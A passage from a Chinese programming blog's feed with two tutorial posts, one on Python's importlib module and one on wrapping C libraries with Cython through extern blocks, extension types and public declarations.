            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python importlib讲解</title>
      <link href="/2017/12/21/Python-importlib%E8%AE%B2%E8%A7%A3/"/>
      <url>/2017/12/21/Python-importlib%E8%AE%B2%E8%A7%A3/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>Python importlib讲解</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>Python标准库中提供了importlib模块，目的是提供import语句（还有<strong>import</strong>()）的底层实现，另外，importlib让程序员可以在导入过程中创建自己的对象。之前的imp模块在Python3.4中被importlib取代了。<br>importlib模块非常复杂，下面只讲解其中的一部分内容。</p><h2 id="动态导入"><a href="#动态导入" class="headerlink" title="动态导入"></a>动态导入</h2><p>importlib支持通过字符串动态导入模块，如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">imoprt importlib</div><div class="line"></div><div class="line"><span class="comment">#导入foo.py模块</span></div><div class="line">foo = importlib.import_module(<span class="string">'foo'</span>)</div><div class="line">foo.main()</div></pre></td></tr></table></figure></p><h2 id="模块导入检查"><a href="#模块导入检查" class="headerlink" title="模块导入检查"></a>模块导入检查</h2><p>导入模块当模块不存在时会抛出ImportError异常，如果我们想在导入模块之前检查该模块是否可以被导入，可以使用importlib模块进行检查，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> importlib.util</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_module</span><span class="params">(module_name)</span>:</span></div><div class="line">    <span class="string">"""检查模块时候能被导入而不用实际的导入模块"""</span></div><div class="line">    module_spec = importlib.util.find_spec(module_name)</div><div class="line">    <span class="keyword">if</span> module_spec <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        print(<span class="string">'Module: &#123;&#125; not found'</span>.format(module_name))</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'Module: &#123;&#125; can be imported!'</span>.format(module_name))</div><div class="line">        <span class="keyword">return</span> module_spec</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_module_from_spec</span><span class="params">(module_spec)</span>:</span></div><div class="line">    <span class="string">"""通过传入模块的spec返回新的被导入的模块对象"""</span></div><div class="line">    module = importlib.util.module_from_spec(module_spec)</div><div class="line">    module_spec.loader.exec_module(module)</div><div class="line">    <span class="keyword">return</span> module</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    module_spec = check_module(<span class="string">'fake_module'</span>)</div><div class="line">    module_spec = check_module(<span class="string">'collections'</span>)</div><div class="line">    <span class="keyword">if</span> module_spec:</div><div class="line">        module = import_module_from_spec(module_spec)</div><div class="line">        print(dir(module))</div></pre></td></tr></table></figure></p><h2 id="从源文件中导入"><a href="#从源文件中导入" class="headerlink" title="从源文件中导入"></a>从源文件中导入</h2><p>importlib.util工具还有一个功能，可以在仅仅知道模块名字和路径的情况下通过该工具导入，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> importlib.util</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_source</span><span class="params">(module_name)</span>:</span></div><div class="line">    module_file_path = module_name.__file__</div><div class="line">    module_name = module_name.__name__</div><div class="line"></div><div class="line">    module_spec = importlib.util.spec_from_file_location(module_name, module_file_path)</div><div class="line">    module = importlib.util.module_from_spec(module_spec)</div><div class="line">    module_spec.loader.exec_module(module)</div><div class="line">    print(dir(module))</div><div class="line"></div><div class="line">    msg = <span class="string">'The &#123;module_name&#125; module has the following methods: &#123;methods&#125;'</span></div><div class="line">    print(msg.format(module_name=module_name, methods=dir(module)))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">import</span> os</div><div class="line">    import_source(os)</div></pre></td></tr></table></figure></p><h2 id="import-from-github-com"><a href="#import-from-github-com" class="headerlink" title="import_from_github_com"></a>import_from_github_com</h2><p>有一个优雅的模块import_from_github_com可以从github中寻找并加载模块，该模块使用了PEP 302中提供的import hook来实现功能。该模块并没有使用importlib模块，而是使用pip安装模块，如果pip没有安装则使用Python的<strong>import</strong>()函数实际导入新的安装模块。</p><p> <strong>参考：《Python 201》第五章</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Python模块tips </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第七章 用Cython包装C库</title>
      <link href="/2017/12/21/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%94%A8Cython%E5%8C%85%E8%A3%85C%E5%BA%93/"/>
      <url>/2017/12/21/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%94%A8Cython%E5%8C%85%E8%A3%85C%E5%BA%93/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>用Cython包装C库</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>前面我们学习了如何使用Cython通过静态编译将Python性能得到提升，本章我们将关注逆向问题：从C库开始，如何让它能够被Python访问。这样的任务通常是交给专业的工具如SWIG、SIP、Boost.Python、ctypes、cffi或者其他的。Cython虽然不会像某些工具那样自动化处理，但是它提供了简单的包装外部库的方法。Cython也可以让C级别的Cython结构被外部的C访问，这对于我们想要将Python嵌入到C语言中很有用。</p><h2 id="在Cython中声明外部C代码"><a href="#在Cython中声明外部C代码" class="headerlink" title="在Cython中声明外部C代码"></a>在Cython中声明外部C代码</h2><p>为了用Cython包装C库，首先要在Cython中声明要是用的C组件的接口，最后，Cython提供了extern语句块。这些声明意在告诉Cython我们要用的C组件来自哪个特殊的C头文件，语法如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header_name"</span>:</div><div class="line">    indented declarations <span class="keyword">from</span> header file</div></pre></td></tr></table></figure></p><p>包含extern语句块有如下作用：</p><ul><li>cython编译器会在生成的源文件头部添加一句#include “header_name”代码</li><li>代码块中的类型、函数和其他的对象声明都可以从Cython访问</li><li>Cython会在编译的时候检查C声明的类型使用是否正确，不正确会报错<br>extern语块中声明的变量和函数都有一个简单的类C风格的语法，他们使用Cython特殊的语法声明struct和union，在第三章有简单介绍过。<br>Cython支持extern关键字，可以通过cdef添加任何C声明，语法如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cdef extern external_declaration</div></pre></td></tr></table></figure></li></ul><p>当我们用这种方式使用extern，Cython将放置这些声明如变量、struct、union或者其他C声明到有extern修饰符的生成的源码中，Cython的extern声明必须匹配C的声明。这种风格的声明是不推荐的，他和直接在C中使用extern有相同的缺点，建议优先使用extern语块。<br>对于一个特殊的头文件如果有必要有一个#include预处理指令，但是不需要声明，声明语块可以是空：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header.h"</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p><p>相反，如果头文件不是必要的，也许已经被其他的头文件包含了，但是我们希望与外部有接口，我们可以抑制生成#include语块：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> *:</div><div class="line">    declarations</div></pre></td></tr></table></figure></p><p>在我们进入声明块的细节之前，extern是什么也不会做的。</p><h2 id="Cython不会自动包装"><a href="#Cython不会自动包装" class="headerlink" title="Cython不会自动包装"></a>Cython不会自动包装</h2><p>extern语块的目的是简单，但是可能会被误导。在Cython中，extern语块和extern声明的存在是为了确保我们以一种正确的类型方式调用和使用的声明的C函数，变量和结构体。extern语块不会自动的为声明的对象生成包装器，extern语块只会在C代码前面添加一行#include “header.h”代码。我们还是要编写def，cdef和cpdef函数调用extern语块中声明的C函数。如果我们不这样做，extern语块中声明的外部C函数就不会被Python代码访问到。Cython不会解析C文件和自动包装C库。<br>使用Cython包装有上百个函数，结构体和其他结构的庞大的C项目任务很艰难，但是已经不少成功的先例了，他们选择Cython作为包装工具有下面一些原因：</p><ul><li>Cython生成的包装代码是高度优化的，比其他的工具的速度快一个数量级</li><li>通常的目标是定制，改进，简化或者相反Pythonize化包装的接口，所以一个自动包装的工具不会提供太多的好处</li><li>Cython是一门高级的Python-like语言，不限于特定领域的接口命令，使复杂的包装任务更加容易</li></ul><h2 id="声明外部的C函数和typedef"><a href="#声明外部的C函数和typedef" class="headerlink" title="声明外部的C函数和typedef"></a>声明外部的C函数和typedef</h2><p>extern语块中最常见的声明是C函数和typedef，这些声明几乎直接从C中转换过来。通常，唯一要修改的有下面几点：</p><ul><li>将typedef换成ctypedef</li><li>移除不必要的和不支持的关键字，如restrict和volatile</li><li>确保返回的函数类型和名称在单独的一行声明过</li><li>移除行结束分号<br>在参数列表的开始括号之后，可以在若干行上分割一个长函数声明，就像在Python中一样。下面例子中，header.h中有简单的C声明和宏定义：<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*header.h*/</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> M_PI 3.1415926</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(a, b) ((a) &gt;= (b) ? (a) : (b))</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">double</span> <span class="title">hypot</span><span class="params">(<span class="keyword">double</span>, <span class="keyword">double</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> integral;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> real;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(integral, integral, real)</span></span>;</div><div class="line"></div><div class="line"><span class="function">real *<span class="title">func_arrays</span><span class="params">(integral[], integral[][<span class="number">10</span>], real **)</span></span>;</div></pre></td></tr></table></figure></li></ul><p>Cython中extern语块对他们的声明如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header.h"</span>:</div><div class="line">    double M_PI</div><div class="line">    float MAX(float a, float b)</div><div class="line"></div><div class="line">    double hypot(double x, double y)</div><div class="line"></div><div class="line">    ctypedef int integral</div><div class="line">    ctypedef double real</div><div class="line"></div><div class="line">    void func(integral a, integral b, real c)</div><div class="line"></div><div class="line">    real *func_arrays(integral[] i, integral[][<span class="number">10</span>] j, real **k)</div></pre></td></tr></table></figure></p><p>Cython支持全方位的C声明，甚至是函数指针，当然，简单的类型声明，大部分情况下我们可以直接复制粘贴C函数声明到extern语块中，删除分号就可以了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#复杂指针声明案例</span></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header.h"</span>:</div><div class="line">    void (*signal(void(*)(int)))(int)</div><div class="line"></div><div class="line"><span class="comment">#也可以这样声明</span></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header.h"</span>:</div><div class="line">    ctypedef void (*void_int_fptr)(int)</div><div class="line">    void_int_fptr signal(void_int_fptr)</div></pre></td></tr></table></figure></p><h2 id="声明和包装C的struct，union和enum"><a href="#声明和包装C的struct，union和enum" class="headerlink" title="声明和包装C的struct，union和enum"></a>声明和包装C的struct，union和enum</h2><p>为了在extern语块中声明额外的struct，union和enum结构，我们可以使用第三章提到的语法，但是可以省略cdef关键字，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header_name"</span>:</div><div class="line">    struct struct_name:</div><div class="line">        struct_members</div><div class="line"></div><div class="line">    union union_name:</div><div class="line">        union_members</div><div class="line"></div><div class="line">    enum enum_name:</div><div class="line">        enum_members</div><div class="line"></div><div class="line"><span class="comment">#对应的C代码是</span></div><div class="line">struct struct_name &#123;</div><div class="line">    struct_members</div><div class="line">&#125;;</div><div class="line"></div><div class="line">union union_name &#123;</div><div class="line">    union_members</div><div class="line">&#125;;</div><div class="line"></div><div class="line">enum enum_name &#123;</div><div class="line">    enum_members</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>Cython会为生成等价的struct，union和enum结构，相应的，typedef的版本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header_name"</span>:</div><div class="line">    ctypedef struct struct_alias:</div><div class="line">        struct_members</div><div class="line"></div><div class="line">    ctypedef union union_alias:</div><div class="line">        union_members</div><div class="line"></div><div class="line">    ctypedef enum enum_alias:</div><div class="line">        enum_members</div><div class="line"></div><div class="line"><span class="comment">#对应的C代码是</span></div><div class="line">typedef struct struct_name &#123;</div><div class="line">    struct_members</div><div class="line">&#125; struct_alias;</div><div class="line"></div><div class="line">typedef union union_name &#123;</div><div class="line">    union_members</div><div class="line">&#125; union_alias;</div><div class="line"></div><div class="line">typedef enum enum_name &#123;</div><div class="line">    enum_members</div><div class="line">&#125; enum_alias;</div></pre></td></tr></table></figure></p><p>在typedef的版本中，Cython只会使用类型别名来进行声明，但是不会生成定义中的struct，union和enum。<br>在Cython中静态声明一个struct变量，使用cdef和struct名称或者typedef别名，Cython在任何情况下都会为我们做正确的事情。<br>定义struct，union和enum时，属性字段是必须的，如果struct没有属性字段，可以使用pass代替。</p><h2 id="包装C函数"><a href="#包装C函数" class="headerlink" title="包装C函数"></a>包装C函数</h2><p>当我们声明了我们想使用的额外的函数，我们还需要包装他们成一个def函数，cpdef函数或者是cdef class，让他们能被Python访问。<br>如下面例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#mt.pxd</span></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"mt19937ar.h"</span>:</div><div class="line">    void init_genrand(unsigned long s)</div><div class="line">    double genrand_real1()</div><div class="line"></div><div class="line"><span class="comment">#mt_random.pyx</span></div><div class="line">cimport mt</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_state</span><span class="params">(unsigned long s)</span>:</span></div><div class="line">    init_genrand(s)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> genrand_real1()</div><div class="line"></div><div class="line"><span class="comment">#setup.py</span></div><div class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup, Extension</div><div class="line"><span class="keyword">from</span> Cython.Build <span class="keyword">import</span> cythonize</div><div class="line"></div><div class="line">ext = Extension(<span class="string">"mt_random"</span>, sources=[<span class="string">"mt_random.pyx"</span>, <span class="string">"mt19937ar.c"</span>])</div><div class="line"></div><div class="line">setup(name=<span class="string">"mersenne_random"</span>, ext_modules = cythonize([ext]))</div><div class="line"></div><div class="line"><span class="comment">#编译</span></div><div class="line">$ python setup.py build_ext --inplace</div></pre></td></tr></table></figure></p><p>为了使它们一起编译，我们使用了distutils脚本，另外我们还必须包含mt19937ar.c源文件，然后使用第二章讲到的内容进行编译。如果命令执行成功，会生成一个mt_random.so或者mt_random.pyd文件，这取决于编译系统是Linux，Mac OS还是Windows。然后就可以在ipython中使用它们：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> mt_random</div><div class="line">In [<span class="number">2</span>]: mt_random.init_state(<span class="number">42</span>)</div><div class="line">In [<span class="number">3</span>]: mt_random.rand()</div><div class="line">Out[<span class="number">3</span>]: <span class="number">0.37454011439684315</span></div><div class="line"></div><div class="line">In [<span class="number">4</span>]: mt_random.init_genrand(<span class="number">42</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">File <span class="string">"&lt;ipython-input-2-34528a64a483&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">mt_random.init_genrand(<span class="number">42</span>)</div><div class="line">AttributeError: <span class="string">'module'</span> object has no attribute <span class="string">'init_genrand'</span></div><div class="line">In [<span class="number">5</span>]: mt_random.genrand_real1()</div><div class="line">Traceback (most recent call last):</div><div class="line">File <span class="string">"&lt;ipython-input-3-23619324ba3f&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">mt_random.genrand_real1()</div><div class="line">AttributeError: <span class="string">'module'</span> object has no attribute <span class="string">'genrand_real1'</span></div></pre></td></tr></table></figure></p><p>我们不能直接在Python中使用init_genrand或者genrand_real1函数。</p><h2 id="使用扩展类型包装C语言struct"><a href="#使用扩展类型包装C语言struct" class="headerlink" title="使用扩展类型包装C语言struct"></a>使用扩展类型包装C语言struct</h2><p>我们的C代码有些面一些声明函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">mt_state</span> <span class="title">mt_state</span>;</span></div><div class="line"></div><div class="line"><span class="function">mt_state *<span class="title">make_mt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> s)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_mt</span><span class="params">(mt_state *state)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">double</span> <span class="title">genrand_real1</span><span class="params">(mt_state *state)</span></span>;</div></pre></td></tr></table></figure></p><p>Cython的extern语句声明他们只需要简单的复制粘贴就好了：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"mt19937ar-struct.h"</span>:</div><div class="line">    ctypedef struct mt_state</div><div class="line">    mt_state *make_mt(unsigned long s)</div><div class="line">    void free_mt(mt_state *state)</div><div class="line">    double genrand_real1(mt_state *state)</div></pre></td></tr></table></figure></p><p>因为mt_state是透明的，Cython不必访问他的任何字段，所以用ctypedef声明就够了，本质上，mt_state是一个命名占位符。<br>但是extern语块中的声明Python都不能访问，所以有必要将他们包装成扩展类型，这里命名为MT。因为初始化一个MT对象之前创建mt_state的堆分配操作必须发生在C层面，所以要在正确的地方实现<strong>cinit</strong>()方法和相对应的<strong>dealloc</strong>()方法释放资源。然后我们定义def或者cpdef方法调用相应的C函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#mt_random_type.pyx</span></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">MT</span>:</span></div><div class="line">    cdef mt_state *_thisptr</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cinit__</span><span class="params">(self, unsigned long s)</span>:</span></div><div class="line">        self._thisptr = make_mt(s)</div><div class="line">        <span class="keyword">if</span> self._thisptr == NULL:</div><div class="line">            msg = <span class="string">"Insufficient memory."</span></div><div class="line">            <span class="keyword">raise</span> MemoryError(msg)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__dealloc__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self._thisptr != NULL:</div><div class="line">        free_mt(self._thisptr)</div><div class="line"></div><div class="line">    cpdef double rand(self):</div><div class="line">        <span class="keyword">return</span> genrand_real1(self._thisptr)</div></pre></td></tr></table></figure></p><p>为了使用这个扩展类型的包装，我们必须编译它为一个扩展模块。我们编译这个包装的mt_random_type.pyx文件和mt19937ar-struct.c源代码。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#setup_mt_type.py</span></div><div class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup, Extension</div><div class="line"><span class="keyword">from</span> Cython.Build <span class="keyword">import</span> cythonize</div><div class="line"></div><div class="line">ext_type = Extension(<span class="string">"mt_random_type"</span>, sources=[<span class="string">"mt_random_type.pyx"</span>, <span class="string">"mt19937ar-struct.c"</span>])</div><div class="line"></div><div class="line">setup( name=<span class="string">"mersenne_random"</span>, ext_modules = cythonize([ext_type]) )</div><div class="line"></div><div class="line"><span class="comment">#进行编译</span></div><div class="line">$ python setup_mt_type.py build_ext --inplace</div></pre></td></tr></table></figure></p><p>然后可以导入使用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> mt_random_type <span class="keyword">import</span> MT</div><div class="line">In [<span class="number">2</span>]: mt1, mt2 = MT(<span class="number">0</span>), MT(<span class="number">0</span>)</div><div class="line">In [<span class="number">3</span>]: mt1.rand() == mt2.rand()</div><div class="line">Out[<span class="number">3</span>]: <span class="keyword">True</span></div></pre></td></tr></table></figure></p><p>在Cython中包装C struct，上面的例子是比较常见和推荐的模式，struct指针只在内部使用，定义<strong>cinit</strong>()和<strong>dealloc</strong>()方法用来初始化和自动释放内存，定义对应的cpdef方法供Python访问，甚至可以在Python子类中被重写。</p><h2 id="常量，其他修饰符和控制Cython生成的内容"><a href="#常量，其他修饰符和控制Cython生成的内容" class="headerlink" title="常量，其他修饰符和控制Cython生成的内容"></a>常量，其他修饰符和控制Cython生成的内容</h2><p>在第三章提到过，Cython语言理解const关键字，但是def关键字声明没有用，它要在特定情况下在extern语块中声明保证Cython生成正确的代码。const关键字在声明函数参数的时候没有必要，可以省略掉，当我们声明typedef用到了const或者一个函数的返回值用到了const的时候可能需要保留。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#C语言中的声明</span></div><div class="line">typedef const int * const_int_ptr;</div><div class="line">const double *returns_ptr_to_const(const_int_ptr);</div><div class="line"></div><div class="line"><span class="comment">#Cython中的声明</span></div><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"header.h"</span>:</div><div class="line">    ctypedef const int * const_int_ptr</div><div class="line">    const double *returns_ptr_to_const(const_int_ptr)</div></pre></td></tr></table></figure></p><p>其他C级别的修饰符，如volatile和restrict应该在extern语块中删除，他们会导致编译时错误。<br>有时候在Cython中使用函数，struct或者typedef的别名很有用，它允许我们在Cython中引用C级别中的一个名字但是不同于在C中的实际的名字。假设我们想包装使用C语言中的print函数，但是会和Cython中的print造成冲突，我们就可以使用别名：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"printer.h"</span>:</div><div class="line">    void _print <span class="string">"print"</span>(fmt_str, arg)</div></pre></td></tr></table></figure></p><p>在Cython中调用_print函数就是调用C中的print函数，同样的typedefs，structs，unions和enums也可以这样使用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">cdef extern <span class="keyword">from</span> <span class="string">"pathological.h"</span>:</div><div class="line">    <span class="comment"># typedef void * class</span></div><div class="line">    ctypedef void * klass <span class="string">"class"</span></div><div class="line"></div><div class="line">    <span class="comment"># int finally(void) function</span></div><div class="line">    int _finally <span class="string">"finally"</span>()</div><div class="line"></div><div class="line">    <span class="comment"># struct del &#123; int a, b; &#125;;</span></div><div class="line">    struct _del <span class="string">"del"</span>:</div><div class="line">        int a, b</div><div class="line"></div><div class="line">    <span class="comment"># enum yield &#123; ALOT; SOME; ALITTLE; &#125;;</span></div><div class="line">    enum _yield <span class="string">"yield"</span>:</div><div class="line">        ALOT</div><div class="line">        SOME</div><div class="line">        ALITTLE</div></pre></td></tr></table></figure></p><p>在任何情况下，引号中的字符串表示C语言中的代码，Cython没有检查引号中的内容，所以这个特性可以用来控制C级别的声明，注意不要滥用。</p><h2 id="暴露Cython代码给C使用"><a href="#暴露Cython代码给C使用" class="headerlink" title="暴露Cython代码给C使用"></a>暴露Cython代码给C使用</h2><p>正如我们在第三章看到的，Cython允许我们使用cdef关键字声明C级别的函数、变量和结构体，看到了我们如何在Cython中直接使用C级别的结构。假设，在一个应用中，一个外部的C函数调用cdef Cython函数是很有用的，本质上是用C语言包装Python。虽然这情况种使用需求很小，但是确实有需求，Cython提供了两种机制来支持这个需求。</p><p>第一种机制是通过public关键字，我们已经看到public关键字可以声明扩展类型的属性外不可见性。这里我们看看他不同的用途。如果我们添加public关键字到C级别的cdef类型，变量或者函数声明，然后这个结构可以被编译的C代码访问或者被扩展模块链接。<br>如下面例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#transcendentals.pyx</span></div><div class="line">cdef public double PI = <span class="number">3.1415926</span></div><div class="line"></div><div class="line">cdef public double get_e():</div><div class="line">    <span class="keyword">print</span> <span class="string">"calling get_e()"</span></div><div class="line">    <span class="keyword">return</span> <span class="number">2.718281828</span></div></pre></td></tr></table></figure></p><p>当我们从transcendentals.pyx生成扩展模块时，public修饰的结构会被cython编译器输出一个transcendentals.h头文件添加到transcendentals.c中。这个头文件声明了对Cython源码的公共C接口。它必须被包含在外部的C代码中，如果外部的C代码想调用get_e()函数或者使用变量PI。<br>外部的C代码调用我们的Cython代码必须同时确保使用Py_Initialize初始化Python解释器和使用inittranscendentals初始化模块，在我们使用任何public结构之前。<br>代码如下：<br><figure 